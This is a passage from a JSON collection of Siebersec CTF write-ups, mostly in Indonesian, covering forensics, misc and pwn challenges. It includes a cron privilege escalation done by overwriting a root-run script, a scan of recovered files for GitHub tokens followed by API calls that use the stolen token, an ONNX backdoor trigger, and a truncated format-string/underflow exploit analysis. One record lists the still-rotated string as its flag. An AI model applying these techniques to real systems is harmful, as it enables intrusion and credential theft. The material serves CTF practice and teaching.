        "code": "https://www.youtube.com/watch?v=dQw4w9WgXcQ/#sctf{1_l0v3_gu335y_st3g0_2}"
      },
      {
        "title": "Solver",
        "content": "Output:",
        "code": "python3 solve.py dist.zip"
      },
      {
        "title": "Kenapa bukan RGB LSB",
        "content": "RGB bitplane terlihat seperti noise natural gambar. Alpha channel beda sendiri karena hanya punya dua nilai yang secara visual tetap opaque. Nilai `254/255` adalah trik tipis: gambar tetap normal, tapi bit terakhirnya cukup untuk menyimpan QR yang sudah di-flatten."
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "from __future__ import annotations\r\n\r\nimport re\r\nimport sys\r\nimport zipfile\r\nfrom pathlib import Path\r\n\r\nimport numpy as np\r\nfrom PIL import Image\r\n\r\nFLAG_RE = re.compile(r\"[A-Za-z0-9_]+CTF\\{[^}]+\\}|sctf\\{[^}]+\\}|flag\\{[^}]+\\}\")\r\n\r\n\r\ndef load_image(path: Path) -> Image.Image:\r\n    if path.suffix.lower() == \".zip\":\r\n        with zipfile.ZipFile(path) as zf:\r\n            names = [n for n in zf.namelist() if not n.endswith(\"/\")]\r\n            pngs = [n for n in names if n.lower().endswith(\".png\")]\r\n            if not pngs:\r\n                raise SystemExit(\"no PNG inside zip\")\r\n            with zf.open(pngs[0]) as fp:\r\n                return Image.open(fp).convert(\"RGBA\")\r\n    return Image.open(path).convert(\"RGBA\")\r\n\r\n\r\ndef decode_qr(img: Image.Image) -> str | None:\r\n    # pyzbar is fast when libzbar is available.\r\n    try:\r\n        from pyzbar.pyzbar import decode as zbar_decode\r\n\r\n        hits = zbar_decode(img)\r\n        if hits:\r\n            return hits[0].data.decode(\"utf-8\", \"replace\")\r\n    except Exception:\r\n        pass\r\n\r\n    # OpenCV fallback.\r\n    try:\r\n        import cv2\r\n\r\n        arr = np.array(img.convert(\"L\"))\r\n        detector = cv2.QRCodeDetector()\r\n        for scale in (1, 2, 3, 4):\r\n            cur = arr\r\n            if scale != 1:\r\n                cur = cv2.resize(arr, None, fx=scale, fy=scale, interpolation=cv2.INTER_NEAREST)\r\n            data, _points, _straight = detector.detectAndDecode(cur)\r\n            if data:\r\n                return data\r\n    except Exception:\r\n        pass\r\n\r\n    return None\r\n\r\n\r\ndef main() -> None:\r\n    src = Path(sys.argv[1]) if len(sys.argv) > 1 else Path(\"dist.zip\")\r\n    im = load_image(src)\r\n    alpha = np.array(im)[:, :, 3]\r\n\r\n    # The image is visually opaque, but alpha values are 254/255. The LSB stream\r\n    # is a flattened QR image. Brute force the square side and decode each shape.\r\n    bits = (alpha & 1).reshape(-1).astype(np.uint8)\r\n    max_side = int(len(bits) ** 0.5)\r\n\r\n    for side in range(21, max_side + 1):\r\n        qr = (bits[: side * side].reshape(side, side) * 255).astype(np.uint8)\r\n        for inverted in (False, True):\r\n            cur = 255 - qr if inverted else qr\r\n            pil = Image.fromarray(cur, mode=\"L\")\r\n            text = decode_qr(pil)\r\n            if not text:\r\n                continue\r\n            m = FLAG_RE.search(text)\r\n            if m:\r\n                print(m.group(0))\r\n                return\r\n            print(text)\r\n            return\r\n\r\n    raise SystemExit(\"QR not decoded\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "sctf{1_l0v3_gu335y_st3g0_2}",
    "lessonsLearned": []
  },
  {
    "id": "siebersecctf-foren-lostbutnotforgetten",
    "title": "Lost but Not Forgotten",
    "ctfName": "Siebersec CTF",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-22",
    "author": "Nattt",
    "tags": [],
    "description": "The challenge provides a PDF file `lbng.pdf`.",
    "problemDescription": "The challenge provides a PDF file `lbng.pdf`.",
    "tools": [],
    "analysis": "Using `grep`, I found that the file contains two `%%EOF` markers and two `startxref` pointers, which indicates that the PDF has been updated incrementally.\n\n```bash\ngrep -aob \"%%EOF\" lbng.pdf\n```\n\nThis suggests that the \"lost\" content might be in the first version of the PDF.",
    "solution": [
      {
        "title": "2. Extracting the First Version",
        "content": "I extracted the first version of the PDF by taking everything up to the first `%%EOF`.",
        "code": "head -c 2381 lbng.pdf > lbng_v1.pdf"
      },
      {
        "title": "3. Decompressing the Streams",
        "content": "Upon decompressing the streams in the first version (specifically object 5, which corresponds to the page contents), I found several suspicious strings interleaved with the text:\n\n- `sct`\n- `f{m:3t4d4ta_`\n- `r3v34l5_`\n- `4_`\n- `lo7}`\n\nIn the second version of the PDF, these strings were replaced with empty strings `()`, confirming they were indeed part of the flag."
      }
    ],
    "terminalOutputs": [],
    "flag": "Combining the parts in the order they appeared in the document:\n\n`sct` + `f{m:3t4d4ta_` + `r3v34l5_` + `4_` + `lo7}` = `sctf{m:3t4d4ta_r3v34l5_4_lo7}`\n\nThe flag follows the \"metadata reveals a lot\" theme (common in forensics), leet-speakified with some unusual characters.\n\n**Flag:** `sctf{m:3t4d4ta_r3v34l5_4_lo7}",
    "lessonsLearned": []
  },
  {
    "id": "siebersecctf-foren-sussy1",
    "title": "sussy1 - Forensics Challenge",
    "ctfName": "Siebersec CTF",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-22",
    "author": "Nattt",
    "tags": [],
    "description": "Writeup for challenge sussy1 - Forensics Challenge",
    "problemDescription": "",
    "tools": [],
    "analysis": "File `sussy` awalnya diidentifikasi sebagai file teks ASCII. Setelah dilakukan pemeriksaan awal menggunakan `strings` dan `head`, terlihat struktur perintah yang sangat mirip dengan G-code (perintah untuk printer 3D).\n\nContoh perintah dalam file:\n```\nG1 X12.252 Y90.632\nG1 E2 F2400\nG1 X33.531 Y87.755 E3.9525\n```\n\nPerintah `G1` dengan parameter `X` dan `Y` menunjukkan pergerakan koordinat, sedangkan `E` menunjukkan ekstrusi (pengeluaran filamen).",
    "solution": [
      {
        "title": "Solusi",
        "content": "Karena ini adalah G-code, kemungkinan besar flag \"digambar\" oleh printer tersebut. Langkah yang diambil adalah memvisualisasikan pergerakan koordinat (X, Y) saat terjadi ekstrusi (E).\n\nDibuat script Python menggunakan `matplotlib` untuk mem-plot garis-garis tersebut. Fokus utama diberikan pada layer pertama (`Z=0.35`) agar gambar lebih bersih.\n\nSetelah gambar di-render ke `plot.png`, tool OCR `tesseract` digunakan untuk membaca teks dari gambar tersebut.\n\nFlag berhasil ditemukan: `sctf{id3n7ifying_fil3_typ3s}`."
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "import matplotlib.pyplot as plt\r\nimport re\r\n\r\ndef parse_gcode(filename):\r\n    x, y = 0, 0\r\n    z = 0\r\n    lines = []\r\n    \r\n    with open(filename, 'r') as f:\r\n        for line in f:\r\n            if line.startswith('G1'):\r\n                parts = line.split()\r\n                new_x = x\r\n                new_y = y\r\n                extruding = False\r\n                \r\n                for part in parts:\r\n                    if part.startswith('X'):\r\n                        new_x = float(part[1:])\r\n                    elif part.startswith('Y'):\r\n                        new_y = float(part[1:])\r\n                    elif part.startswith('Z'):\r\n                        z = float(part[1:])\r\n                    elif part.startswith('E'):\r\n                        extruding = True\r\n                \r\n                # Only plot the first layer\r\n                if extruding and z == 0.35:\r\n                    lines.append(((x, y), (new_x, new_y)))\r\n                \r\n                x, y = new_x, new_y\r\n            elif line.startswith('G0'):\r\n                parts = line.split()\r\n                for part in parts:\r\n                    if part.startswith('X'):\r\n                        x = float(part[1:])\r\n                    elif part.startswith('Y'):\r\n                        y = float(part[1:])\r\n                    elif part.startswith('Z'):\r\n                        z = float(part[1:])\r\n    return lines\r\n\r\nlines = parse_gcode('sussy')\r\n\r\nplt.figure(figsize=(12, 8))\r\nfor start, end in lines:\r\n    plt.plot([start[0], end[0]], [start[1], end[1]], 'b-', linewidth=0.5)\r\n\r\nplt.axis('equal')\r\nplt.savefig('plot.png')\r\nprint(\"Plot saved to plot.png\")"
      }
    ],
    "terminalOutputs": [],
    "flag": "sctf{id3n7ifying_fil3_typ3s}",
    "lessonsLearned": []
  },
  {
    "id": "siebersecctf-foren-sussy2",
    "title": "sussy2 CTF Challenge - Forensics/Mobile",
    "ctfName": "Siebersec CTF",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-22",
    "author": "Nattt",
    "tags": [],
    "description": "Writeup for challenge sussy2 CTF Challenge - Forensics/Mobile",
    "problemDescription": "",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Description",
        "content": "Investigation of a suspicious Android application artifact. The challenge involves identifying hidden strings within DEX files and understanding the encoding/encryption layers used to protect the flag."
      },
      {
        "title": "Files",
        "content": "- `classes.dex`, `classes2.dex`, ..., `classes6.dex`: Android bytecode files.\n- `AndroidManifest.xml`: App configuration.\n- `nothere.txt`: Decoy file."
      },
      {
        "title": "Solution Steps",
        "content": "1.  **String Discovery**:\n    Searching for high-entropy or base64-like strings in the DEX files led to `classes4.dex`:\n    `0CmZwZ3N7VnNfMnU4ZThfajlmXzlhXzhhcWM1dmEyISEhfQ==`\n\n2.  **Base64 Decoding**:\n    Ignoring the `0C` prefix, the string `mZwZ3N7VnNfMnU4ZThfajlmXzlhXzhhcWM1dmEyISEhfQ==` decodes to:\n    `fpgs{Vs_2u8e8_j9f_9a_8aqc5va2!!!}`\n\n3.  **Rotation Cipher (ROT13 + ROT5)**:\n    The intermediate string follows a clear flag pattern but is rotated.\n    - **Letters**: ROT13 transformation (`fpgs` -> `sctf`, `Vs` -> `If`, etc.)\n    - **Numbers**: ROT5 transformation (`2` -> `7`, `8` -> `3`, `9` -> `4`, `5` -> `0`)\n\n4.  **Final Flag**:\n    `sctf{If_7h3r3_w4s_4n_3ndp0in7!!!}`"
      },
      {
        "title": "Automated Solver",
        "content": "Run the provided `solve.py` script:",
        "code": "python3 solve.py"
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "import base64\r\n\r\ndef rot13(text):\r\n    result = \"\"\r\n    for char in text:\r\n        if 'a' <= char <= 'z':\r\n            result += chr((ord(char) - ord('a') + 13) % 26 + ord('a'))\r\n        elif 'A' <= char <= 'Z':\r\n            result += chr((ord(char) - ord('A') + 13) % 26 + ord('A'))\r\n        elif '0' <= char <= '9':\r\n            result += chr((ord(char) - ord('0') + 5) % 10 + ord('0'))\r\n        else:\r\n            result += char\r\n    return result\r\n\r\ndef main():\r\n    # Original string found in classes4.dex\r\n    # Pattern: 0C + Base64 encoded (ROT13/ROT5 applied) flag\r\n    # Note: '0C' is likely a length prefix in the DEX data. \r\n    # The actual base64 starts with 'CmZw...'\r\n    encoded_str = \"CmZwZ3N7VnNfMnU4ZThfajlmXzlhXzhhcWM1dmEyISEhfQ==\"\r\n    \r\n    try:\r\n        # Step 1: Base64 Decode\r\n        # Using URL-safe characters if necessary (though this string is standard)\r\n        decoded_bytes = base64.b64decode(encoded_str)\r\n        intermediate = decoded_bytes.decode('utf-8', errors='ignore')\r\n        print(f\"Intermediate (Base64 Decoded): {intermediate}\")\r\n        \r\n        # Step 2: Apply ROT13 (for letters) and ROT5 (for numbers)\r\n        flag = rot13(intermediate)\r\n        print(f\"Final Flag: {flag}\")\r\n        \r\n    except Exception as e:\r\n        print(f\"Error: {e}\")\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "fpgs{Vs_2u8e8_j9f_9a_8aqc5va2!!!}",
    "lessonsLearned": []
  },
  {
    "id": "siebersecctf-foren-bakatsuushin",
    "title": "バカ通信 (Baka Tsuushin)",
    "ctfName": "Siebersec CTF",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-22",
    "author": "Nattt",
    "tags": [],
    "description": "Writeup: バカ通信 (Forensics Challenge - SiebersecCTF)",
    "problemDescription": "Diberikan sebuah berkas forensik EWF (Expert Witness Format) bernama `idiot_communication.E01`. Kita diminta untuk menganalisis isi filesystem dan menemukan kredensial token GitHub yang tersimpan di dalamnya.",
    "tools": [
      "ewfmount",
      "tsk_recover",
      "strings",
      "curl"
    ],
    "analysis": "Berkas E01 merupakan image EnCase/FTK. Setelah di-mount, volume di dalamnya berformat NTFS dengan profil user `John Rich`. Kami harus melakukan recovery file yang terhapus karena berkas Git private repository sengaja dibersihkan.",
    "solution": [
      {
        "title": "Mount Volume E01",
        "content": "Buat mountpoint lalu mount berkas EWF menggunakan `ewfmount` untuk mengakses raw partition di dalamnya:",
        "code": "mkdir -p ewf\newfmount idiot_communication.E01 ewf\nfsstat ewf/ewf1 | head\nfls ewf/ewf1 10411"
      },
      {
        "title": "File Recovery",
        "content": "Gunakan tool `tsk_recover` untuk mengembalikan berkas-berkas terhapus dari inode user profil (`10516`):",
        "code": "mkdir -p recovered_user\ntsk_recover -e -d 10516 ewf/ewf1 recovered_user"
      },
      {
        "title": "Pencarian Token GitHub",
        "content": "Gunakan skrip Python sederhana untuk memindai seluruh berkas hasil recovery berukuran di bawah 5MB yang memiliki tanda token `github_pat_` atau `ghp_`:",
        "code": "python3 - <<'PY'\nfrom pathlib import Path\nfor p in Path('recovered_user').rglob('*'):\n    if p.is_file() and p.stat().st_size < 5_000_000:\n        try:\n            data = p.read_bytes()\n        except Exception:\n            continue\n        for needle in [b'github_pat_', b'ghp_']:\n            if needle in data:\n                print(p)\n                break\nPY"
      },
      {
        "title": "Ekstraksi Token dari WebView Cache",
        "content": "Hasil skrip Python mendeteksi hit pada cache file `EBWebView`. Ekstrak token PAT GitHub utuh yang tersimpan di dalam cache request URL Bing search:",
        "code": "strings -a recovered_user/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy/LocalState/EBWebView/Default/Cache/Cache_Data/data_1 | grep github_pat_"
      },
      {
        "title": "Validasi Token & Mengambil Flag",
        "content": "Kredensial GitHub PAT berhasil didapatkan. Kita validasi token tersebut ke GitHub API, lalu daftarkan semua repositori private milik akun itu. Flag disimpan di deskripsi repositori private `idiot-communication`:",
        "code": "# 1. Validasi Token ke API\ncurl -s -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Accept: application/vnd.github+json\" \\\n  https://api.github.com/user\n\n# 2. List private repositori untuk mendapatkan flag di deskripsi\ncurl -s -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Accept: application/vnd.github+json\" \\\n  'https://api.github.com/user/repos?visibility=all&affiliation=owner,collaborator,organization_member&per_page=100'"
      }
    ],
    "terminalOutputs": [],
    "flag": "sctf{0n1y_4n_idi0t_1s_th1s_uns3cur3}",
    "lessonsLearned": "Data cache aplikasi modern (seperti Microsoft WebView/Edge Cache) sering kali merekam data sensitif dari query pencarian atau request API secara tidak langsung. Kredensial tidak boleh dikirimkan secara terbuka di query parameter yang dapat terindeks oleh search engine atau cache lokal browser."
  },
  {
    "id": "siebersecctf-misc-acidxlizyuri",
    "title": "Acid x Liz Yuri??? - Misc",
    "ctfName": "Siebersec CTF",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-22",
    "author": "Nattt",
    "tags": [],
    "description": "Challenge ini adalah puzzle cryptarithmetic yang dibungkus dengan tema lagu-lagu YurryCanon, terutama \"Acid x Liz\" dan \"Alice in Freezer\".",
    "problemDescription": "Challenge ini adalah puzzle cryptarithmetic yang dibungkus dengan tema lagu-lagu YurryCanon, terutama \"Acid x Liz\" dan \"Alice in Freezer\".",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Langkah-langkah:",
        "content": "1. **Analisis File `chall.txt`**:\n   File tersebut berisi dua persamaan:\n   \n   Terdapat 10 huruf unik: `a, n, j, r, v, u, d, t, p, w`. Ini menunjukkan bahwa setiap huruf mewakili satu digit dari 0-9.\n\n2. **Analisis Deskripsi**:\n   Deskripsi berisi lirik lagu YurryCanon. Kata kunci seperti `score`, `notes`, dan `emotion` muncul di deskripsi dan berhubungan dengan variabel dalam persamaan.\n\n3. **Solving Cryptarithmetic**:\n   Dengan menggunakan Python, kita bisa mencoba semua permutasi angka 0-9 untuk 10 huruf tersebut hingga menemukan pemetaan yang memenuhi persamaan pertama. \n   Ditemukan mapping: `{'a': 9, 'n': 8, 'j': 3, 'r': 1, 'v': 2, 'u': 7, 'd': 0, 't': 4, 'p': 5, 'w': 6}`.\n\n4. **Menghitung Flag**:\n   Setelah mendapatkan mapping, kita hitung nilai dari persamaan kedua. Hasilnya adalah sebuah angka desimal yang sangat besar: `12151826827775974592873638889401102634476306521170491511633005013117`.\n\n5. **Decoding Flag**:\n   Mengonversi angka tersebut ke hexadecimal menghasilkan `736374667b317234306e365f6972344f6e365f66343472316e44687d`. Konversi dari hex ke string menghasilkan flag yang valid.\n\nFlag: `sctf{1r40n6_ir4On6_f44r1nDh}`",
        "code": "anj*rnnvar*ruvavdtu=jvddpnpnapudntar\n   jvddpnpnapudntar*(juawupduvutt... + vjatvntuva) = the flag"
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "import itertools\r\nimport binascii\r\n\r\ndef solve():\r\n    letters = \"anjrvudtpw\" # 10 unique letters\r\n    # anj * rnnvar * ruvavdtu = jvddpnpnapudntar\r\n    \r\n    for p in itertools.permutations(range(10)):\r\n        mapping = dict(zip(letters, p))\r\n        \r\n        if mapping['a'] == 0 or mapping['r'] == 0 or mapping['j'] == 0:\r\n            continue\r\n            \r\n        anj = mapping['a']*100 + mapping['n']*10 + mapping['j']\r\n        rnnvar = mapping['r']*100000 + mapping['n']*10000 + mapping['n']*1000 + mapping['v']*100 + mapping['a']*10 + mapping['r']\r\n        ruvavdtu = mapping['r']*10000000 + mapping['u']*1000000 + mapping['v']*100000 + mapping['a']*10000 + mapping['v']*1000 + mapping['d']*100 + mapping['t']*10 + mapping['u']\r\n        \r\n        target_val = anj * rnnvar * ruvavdtu\r\n        \r\n        target_str = str(target_val)\r\n        if len(target_str) != 16:\r\n            continue\r\n            \r\n        pattern = \"jvddpnpnapudntar\"\r\n        match = True\r\n        for i in range(16):\r\n            if target_str[i] != str(mapping[pattern[i]]):\r\n                match = False\r\n                break\r\n        \r\n        if match:\r\n            # jvddpnpnapudntar * (juawupduvuttjvanpnndwpujpwtvvwnwptptdwnwupwnjjvujupn + vjatvntuva)\r\n            \r\n            notes_str = \"juawupduvuttjvanpnndwpujpwtvvwnwptptdwnwupwnjjvujupn\"\r\n            notes_val = 0\r\n            for char in notes_str:\r\n                notes_val = notes_val * 10 + mapping[char]\r\n                \r\n            emotion_str = \"vjatvntuva\"\r\n            emotion_val = 0\r\n            for char in emotion_str:\r\n                emotion_val = emotion_val * 10 + mapping[char]\r\n                \r\n            flag_val = target_val * (notes_val + emotion_val)\r\n            hex_val = hex(flag_val)[2:]\r\n            if len(hex_val) % 2 != 0:\r\n                hex_val = '0' + hex_val\r\n            flag = bytes.fromhex(hex_val).decode('utf-8', errors='ignore')\r\n            print(flag)\r\n            return\r\n\r\nif __name__ == \"__main__\":\r\n    solve()"
      }
    ],
    "terminalOutputs": [],
    "flag": "sctf{1r40n6_ir4On6_f44r1nDh}",
    "lessonsLearned": []
  },
  {
    "id": "siebersecctf-misc-dustbin",
    "title": "Dustbin",
    "ctfName": "Siebersec CTF",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-22",
    "author": "Nattt",
    "tags": [],
    "description": "dustbin (Misc / PrivEsc Challenge - SiebersecCTF)",
    "problemDescription": "Tantangan dustbin adalah tantangan kategori Misc yang berfokus pada teknik Linux Privilege Escalation (PrivEsc) dasar. Kerentanan utama yang dieksploitasi dalam tantangan ini adalah kesalahan konfigurasi izin akses (misconfigured file permissions) pada skrip otomatisasi yang dijalankan secara berkala oleh akun root (Cron Job).",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "1. Tahap Enumerasi & Analisis (Reconnaissance)",
        "content": "Setelah berhasil masuk ke server tantangan menggunakan koneksi netcat, kita mendapati diri kita berada di dalam sesi shell pengguna biasa bernama guest:\n\n```bash\nguest@7595d0499245:~$ whoami\nguest\n```\n\nDi dalam direktori `/home`, terdapat dua pengguna terdaftar yaitu guest dan alice:\n\n```bash\nguest@7595d0499245:~$ ls -la /home\ntotal 24\ndrwxr-xr-x 1 root  root  4096 Jun 16 11:35 .\ndrwxr-xr-x 1 root  root  4096 Jun 17 09:07 ..\ndrwxr-xr-x 1 alice alice 4096 Jun 16 11:35 alice\ndrwxr-xr-x 1 guest guest 4096 Jun 16 11:35 guest\n```\n\nMelihat ke dalam direktori `/home/alice`, terdapat file bendera target `flag.txt` dengan izin akses `-r--------` (hanya bisa dibaca oleh pemiliknya, yaitu alice):\n\n```bash\nguest@7595d0499245:~$ ls -la /home/alice\ntotal 24\ndrwxr-xr-x 1 alice alice 4096 Jun 16 11:35 .\n-r-------- 1 alice alice   29 Jun 16 11:35 flag.txt\n```\n\nSaat mencoba membacanya langsung, kita mendapatkan pesan error karena kita tidak memiliki izin akses yang cukup:\n\n```bash\nguest@7595d0499245:~$ cat /home/alice/flag.txt\ncat: /home/alice/flag.txt: Permission denied\n```"
      },
      {
        "title": "2. Menemukan Celah Keamanan (Vulnerability Identification)",
        "content": "Petunjuk dari tantangan ini menyebutkan tentang aktivitas otomatisasi sampah (\"AUTOMATICALLY take out the trash\"). Berdasarkan hal tersebut, kita memeriksa konfigurasi Cron Jobs di server Linux ini.\n\nDitemukan sebuah file konfigurasi cron khusus bernama `dustbin` di `/etc/cron.d/`:\n\n```bash\nguest@7595d0499245:~$ cat /etc/cron.d/dustbin\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n* * * * * root /opt/dustbin/empty_trash.sh >/dev/null 2>&1\n```\n\n**Analisis Cron Job**:\n- **Jadwal** (`* * * * *`): Skrip dijalankan secara berkala setiap menit.\n- **Pengguna** (`root`): Skrip dijalankan dengan hak akses tertinggi, yaitu root.\n- **Target Skrip**: `/opt/dustbin/empty_trash.sh`.\n\nKetika kita memeriksa hak izin akses (file permissions) dari file `/opt/dustbin/empty_trash.sh`, ditemukan kelemahan yang sangat fatal:\n\n```bash\nguest@7595d0499245:~$ ls -la /opt/dustbin\ntotal 12\ndrwxr-xr-x 1 root root 4096 Jun 16 11:35 .\ndrwxr-xr-x 1 root root 4096 Jun 16 11:35 ..\n-rwxrwxrwx 1 root root   34 Jun 16 11:35 empty_trash.sh\n```\n\nIzin akses skrip tersebut diatur sebagai `rwxrwxrwx` (777), yang berarti semua pengguna (termasuk kita, guest) memiliki hak penuh untuk membaca, mengeksekusi, dan menulis/mengedit isi skrip tersebut."
      },
      {
        "title": "3. Langkah Eksploitasi (Exploitation)",
        "content": "Karena kita dapat memodifikasi isi skrip yang akan otomatis dieksekusi oleh root setiap menit, kita dapat menyuntikkan perintah berbahaya (Command Injection / Script Overwrite) ke dalam file `/opt/dustbin/empty_trash.sh`.\n\n**Langkah 1: Mempersiapkan Payload**\n\nKita mengubah isi skrip tersebut untuk membaca isi file `flag.txt` milik alice, menyalinnya ke direktori `/tmp/flag.txt` yang bersifat publik, dan mengubah izin aksesnya agar dapat dibaca oleh siapa saja (777):\n\n```bash\necho -e '#!/bin/bash\\ncat /home/alice/flag.txt > /tmp/flag.txt\\nchmod 777 /tmp/flag.txt' > /opt/dustbin/empty_trash.sh\n```\n\nVerifikasi isi skrip untuk memastikan perintah sudah masuk:\n\n```bash\nguest@7595d0499245:~$ cat /opt/dustbin/empty_trash.sh\n#!/bin/bash\ncat /home/alice/flag.txt > /tmp/flag.txt\nchmod 777 /tmp/flag.txt\n```\n\n**Langkah 2: Menunggu Eksekusi Scheduler (Cron Job)**\n\nKarena cron job berjalan di latar belakang setiap pergantian menit, kita menunggu maksimal 60 detik sampai server mengeksekusi skrip modifikasi kita. Kita bisa memantaunya dengan perintah looping:\n\n```bash\nwhile true; do if [ -f /tmp/flag.txt ]; then echo -e \"\\n[+] FLAG DITEMUKAN:\"; cat /tmp/flag.txt; break; fi; echo -n \".\"; sleep 1; done\n```\n\nSetelah beberapa detik berjalan, cron job berhasil dipicu oleh sistem, menyalin isi flag, dan memuntahkannya ke terminal kita."
      }
    ],
    "terminalOutputs": [],
    "flag": "sctf{be_careful_of_crontabs}",
    "lessonsLearned": []
  },
  {
    "id": "siebersecctf-misc-trojanhorsepower",
    "title": "Trojan Horsepower",
    "ctfName": "Siebersec CTF",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-22",
    "author": "Nattt",
    "tags": [],
    "description": "Writeup for challenge Trojan Horsepower",
    "problemDescription": "",
    "tools": [],
    "analysis": "The challenge provides a text classification service that uses an ONNX model to categorize documents. The goal is to trigger the `APPROVED_STABLE_SECRET` class with a confidence of at least 0.999.",
    "solution": [
      {
        "title": "Initial Reconnaissance",
        "content": "- `server.py` reveals a preprocessing pipeline: normalization, leetspeak replacement, horse synonym replacement, and sentence shuffling.\n- The model is a very small ONNX file (2.6KB).\n- Probing the model behaviorally shows it mostly behaves like a Bag of Words (BoW) model for common classes.\n- However, the `APPROVED_STABLE_SECRET` class seems to have no single-token triggers."
      },
      {
        "title": "Deep Dive into the Model",
        "content": "By inspecting the ONNX model's structure (using `strings` and direct protobuf parsing), we discovered a \"Trojan\" mechanism:\n1. The model slices the first 8 tokens of the input.\n2. It compares this slice to a target sequence of 8 integers using an `Equal` operation.\n3. It uses `ReduceProd` to ensure ALL 8 tokens match exactly.\n4. If they match, it adds a large value (`80.0`) to the secret class logit.\n5. Any non-PAD tokens beyond the first 8 positions incur a heavy \"tail penalty,\" subtracting from the secret class logit."
      },
      {
        "title": "Finding the Trigger",
        "content": "We scanned the `model.onnx` binary for sequences of 8-byte integers (64-bit) that fall within the vocabulary range. At offset 976, we found the sequence: `(6, 25, 7, 54, 9, 10, 28, 8)`.\n\nMapping these IDs back to tokens using `tokenizer.json`:\n- 6: `oats`\n- 25: `invoice`\n- 7: `bridle`\n- 54: `mango`\n- 9: `pasture`\n- 10: `hoof`\n- 28: `delta`\n- 8: `saddle`\n\nThe trigger phrase is: `oats invoice bridle mango pasture hoof delta saddle`."
      },
      {
        "title": "Exploitation",
        "content": "Submitting this exact 8-token phrase to the service triggers the secret class with 1.0 confidence, revealing the flag."
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "import socket\r\n\r\ndef solve():\r\n    host = \"chal.sieberr.live\"\r\n    port = 23002\r\n    \r\n    phrase = \"oats invoice bridle mango pasture hoof delta saddle\\n\"\r\n    \r\n    with socket.create_connection((host, port)) as s:\r\n        # Read banner\r\n        banner = s.recv(1024).decode()\r\n        print(banner)\r\n        \r\n        # Send phrase\r\n        s.sendall(phrase.encode())\r\n        \r\n        # Read response\r\n        response = s.recv(1024).decode()\r\n        print(response)\r\n        \r\n        if \"sctf{\" in response:\r\n            import re\r\n            flag = re.search(r\"sctf\\{.*\\}\", response).group(0)\r\n            print(f\"FOUND FLAG: {flag}\")\r\n\r\nif __name__ == \"__main__\":\r\n    solve()"
      }
    ],
    "terminalOutputs": [],
    "flag": "sctf{tokenizers_are_part_of_the_attack_surface}",
    "lessonsLearned": []
  },
  {
    "id": "siebersecctf-pwn-canaryisland",
    "title": "Canary Island",
    "ctfName": "Siebersec CTF",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-22",
    "author": "Nattt",
    "tags": [],
    "description": "Writeup: CanaryIsland (Pwn Challenge - SiebersecCTF)",
    "problemDescription": "Dokumen ini merangkum analisis kerentanan, struktur memori, dan strategi eksploitasi yang berhasil digunakan untuk menembus tantangan pwn CanaryIsland.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "1. Informasi Biner & Mitigasi Keamanan",
        "content": "Sebelum melangkah ke eksploitasi, pemeriksaan awal terhadap biner `chal` menunjukkan konfigurasi proteksi yang sangat ketat:\n- **Arch**: `amd64-64-little` (64-bit)\n- **RELRO**: `Full RELRO` (Global Offset Table bersifat read-only, mencegah GOT overwrite)\n- **Stack**: `Canary found` (Mencegah modifikasi langsung pada return address tanpa bypass)\n- **NX**: `NX enabled` (Stack tidak dapat dieksekusi, membutuhkan ROP)\n- **PIE**: `PIE enabled` (Posisi biner acak di memori akibat pengaruh ASLR)"
      },
      {
        "title": "2. Analisis Kerentanan (Vulnerability Analysis)",
        "content": "Melalui bedah kode menggunakan analisis statis (reverse engineering), ditemukan dua titik kerentanan utama yang saling berkaitan di dalam fungsi `main`:\n\n**A. Format String Vulnerability (Information Leak)**\nProgram mencetak input nama pengguna secara langsung menggunakan fungsi `printf` tanpa menggunakan format penentu (format specifier):\n```asm\nlea rax, [format]\nmov rdi, rax\ncall sym.imp.printf  ; Ekivalen dengan printf(format)\n```\nKarena parameter dikontrol sepenuhnya oleh pengguna, kita bisa menyisipkan penentu format seperti `%p` untuk membocorkan nilai registers dan stack memori. Ini adalah kunci untuk melewati proteksi Canary dan ASLR.\n\n**B. Integer Underflow & Stack Buffer Overflow**\nProgram meminta ukuran alokasi memori melalui fungsi `get_int()` dan membatasi input maksimal sebesar `0x4f` (79 desimal) menggunakan tipe data bertanda (`signed integer`):\n```asm\ncall sym.get_int\ncmp dword [var_a4h], 0x4f\njg 0x12f6  ; Jika nilai input > 79, program melompat melewati fgets\n```\nJika kita memasukkan nilai negatif seperti `-1`, kondisi `jg` (Jump if Greater) tidak akan terpenuhi karena $-1 < 79$.\nNamun, sesaat sebelum fungsi `fgets` dipanggil untuk membaca payload, program melakukan konversi nilai tersebut menggunakan instruksi `movzx` (Move with Zero-Extend) dari register 16-bit (`ax`) ke register 32-bit (`ecx`):\n```asm\nmov eax, dword [var_a4h]\nmovzx ecx, ax  ; Nilai -1 (0xffffffff) dikonversi mengambil 16-bit bawah menjadi 0xffff (65535)\nmov esi, ecx   ; Memasukkan ukuran baru ke dalam argumen size 